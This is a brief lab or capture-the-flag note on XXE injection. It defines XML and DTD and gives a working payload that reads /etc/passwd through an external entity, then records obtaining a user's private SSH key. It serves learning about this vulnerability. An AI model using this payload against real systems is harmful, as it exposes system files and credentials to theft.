## XXE

```
IP = 10.10.188.3
```
+ XML (eXtensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data.
+ DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document.
+ Typical XXE payload to test for XXE:	
	`<?xml version="1.0"?>
	 <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
	 <root>&read;</root>`
+ Got the user's private SSH key.